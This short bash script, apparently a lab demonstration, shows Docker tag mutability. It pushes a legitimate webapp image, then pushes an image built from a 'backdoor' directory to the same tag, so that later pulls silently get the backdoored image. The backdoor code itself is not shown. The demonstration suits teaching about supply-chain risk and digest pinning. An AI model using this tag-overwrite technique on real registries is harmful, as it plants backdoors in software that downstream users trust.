#!/bin/bash
# Demonstrates tag mutability: overwrite a "trusted" tag with a backdoored image
set -euo pipefail
REGISTRY="${REGISTRY:-registry:5000}"
echo "[*] Building legitimate image..."
docker build -t "$REGISTRY/webapp:1.0.0" app/
docker push "$REGISTRY/webapp:1.0.0"
echo "[*] Recording digest of legitimate image..."
LEGIT_DIGEST=$(docker inspect --format='{{.Id}}' "$REGISTRY/webapp:1.0.0")
echo "    Legitimate digest: $LEGIT_DIGEST"
echo ""
echo "[*] Building backdoored image and pushing to SAME tag..."
docker build -t "$REGISTRY/webapp:1.0.0" backdoor/
docker push "$REGISTRY/webapp:1.0.0"
BACKDOOR_DIGEST=$(docker inspect --format='{{.Id}}' "$REGISTRY/webapp:1.0.0")
echo "    Backdoored digest: $BACKDOOR_DIGEST"
echo ""
echo "[!] webapp:1.0.0 now points to a DIFFERENT image."
echo "    Anyone pulling webapp:1.0.0 gets the backdoor."
